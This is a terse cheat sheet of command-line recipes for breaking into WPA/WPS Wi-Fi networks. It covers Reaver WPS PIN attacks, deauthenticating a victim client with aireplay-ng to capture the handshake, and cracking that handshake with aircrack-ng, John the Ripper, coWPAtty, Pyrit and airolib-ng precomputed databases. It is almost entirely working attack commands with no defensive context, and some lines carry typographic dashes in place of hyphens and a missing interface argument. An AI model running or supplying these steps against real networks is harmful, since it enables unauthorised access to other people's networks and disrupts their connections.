WPS Attack - Reaver:
    1. $ airmon-ng start wlan0
    2. $ apt-get install reaver
    3. $ wash –i wlan0mon –C
    4. $ reaver –i wlan0mon –b <BSSID> -vv –S
    #or, Specific attack
    
    $ reaver –i –c <Channel> -b <BSSID> -p <PinCode> -vv –S

Dictionary Attack:
    1. $ airmon-ng start wlan0
    2. $ airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
    3. $ aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
    4. $ aircrack-ng –w <WordlistFile> -b <BSSID> <Handshaked_PCAP>

Crack with John The Ripper:
    1. $ airmon-ng start wlan0
    2. $ airodump-ng –c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
    3. $ aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
    4. $ cd /usr/share/passwords/john
    5. $ ./john –wordlist=<Wordlist> --rules –stdout|aircrack-ng -0 –e <ESSID> -w - <PCAP_of_FileName>

Crack with coWPAtty:
    1. $ airmon-ng start wlan0
    2. $ airodump-ng –c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
    3. $ aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
    4. $ cowpatty –r <FileName> -f <Wordlist> -2 –s <SSID>
    5. $ genpmk –s <SSID> –f <Wordlist> -d <HashesFileName>
    6. $ cowpatty –r <PCAP_of_FileName> -d <HashesFileName> -2 –s <SSID>

Crack with Pyrit:
    1. $ airmon-ng start wlan0
    2. $ airodump-ng –c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
    3. $ aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
    4. $ pyrit –r<PCAP_of_FileName> -b <BSSID> -i <Wordlist> attack_passthrough
    5. $ pyrit –i <Wordlist> import_passwords
    6. $ pyrit –e <ESSID> create_essid
    7. $ pyrit batch
    8. $ pyrit –r <PCAP_of_FileName> attack_db
 
Precomputed WPA Keys Database Attack:
    1. $ airmon-ng start wlan0
    2. $ airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
    3. $ aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
    4. $ kwrite ESSID.txt
    5. $ airolib-ng NEW_DB --import essid ESSID.txt
    6. $ airolib-ng NEW_DB --import passwd <DictionaryFile>
    7. $ airolib-ng NEW_DB --clean all
    8. $ airolib-ng NEW_DB --stats
    9. $ airolib-ng NEW_DB --batch
    10. $ airolib-ng NEW_DB --verify all
    11. $ aircrack-ng –r NEW_DB <Handshaked_PCAP>
